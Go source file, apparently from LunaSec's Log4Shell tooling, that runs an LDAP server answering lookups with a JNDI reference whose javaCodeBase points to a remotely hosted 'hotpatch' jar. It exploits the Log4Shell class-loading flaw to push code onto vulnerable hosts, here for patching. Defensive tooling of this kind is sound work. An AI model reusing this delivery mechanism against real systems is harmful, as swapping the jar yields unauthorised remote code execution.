// Copyright 2021 by LunaSec (owned by Refinery Labs, Inc)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
package patch

import (
	"fmt"
	ldapmsg "github.com/lor00x/goldap/message"
	"github.com/lunasec-io/lunasec/tools/log4shell/constants"
	"github.com/lunasec-io/lunasec/tools/log4shell/util"
	"github.com/rs/zerolog/log"
)

import (
	"github.com/vjeantet/ldapserver"
)

type Log4ShellLDAPServer interface {
	Start()
}

type HotpatchLDAPServer struct {
	ipAddress string
}

func NewHotpatchLDAPServer(ipAddress string) Log4ShellLDAPServer {
	return &HotpatchLDAPServer{
		ipAddress: ipAddress,
	}
}

func (s *HotpatchLDAPServer) hotpatchPayloadUrl() string {
	return fmt.Sprintf("http://%s:%d/%s", s.ipAddress, constants.HotpatchServerPort, constants.HotpatchJarFileName)
}

func (s *HotpatchLDAPServer) Start() {
	server := ldapserver.NewServer()
	routes := ldapserver.NewRouteMux()

	routes.Search(s.search)
	routes.Bind(s.bind)
	server.Handle(routes)

	util.HandleProcessExit(func() {
		server.Stop()
	})

	go func() {
		addr := "0.0.0.0:1389"
		log.Debug().
			Str("addr", addr).
			Msg("starting hotpatch server")
		err := server.ListenAndServe(addr)
		if err != nil {
			log.Error().
				Err(err).
				Msg("unable to start ldap server")
			panic(err)
		}
	}()
}

func (s *HotpatchLDAPServer) createSearchResponse(req ldapmsg.SearchRequest) ldapmsg.SearchResultEntry {
	resolvedJNDICodebase := ldapmsg.AttributeValue(s.hotpatchPayloadUrl())

	e := ldapserver.NewSearchResultEntry("cn=log4shell-hotpatch" + string(req.BaseObject()))
	e.AddAttribute("cn", "log4shell-hotpatch")
	e.AddAttribute("javaClassName", "")
	e.AddAttribute("javaCodeBase", resolvedJNDICodebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", "Log4ShellHotpatch")
	return e
}

func (s *HotpatchLDAPServer) search(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
	log.Debug().
		Str("client", msg.Client.Addr().String()).
		Msg("search request from remote client")

	req := msg.GetSearchRequest()

	select {
	case <-msg.Done:
		log.Debug().
			Msg("remote connection closed")
	}

	res := s.createSearchResponse(req)
	w.Write(res)
}

func (s *HotpatchLDAPServer) bind(w ldapserver.ResponseWriter, msg *ldapserver.Message) {
	log.Debug().
		Str("client", msg.Client.Addr().String()).
		Msg("bind request from remote client")

	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}
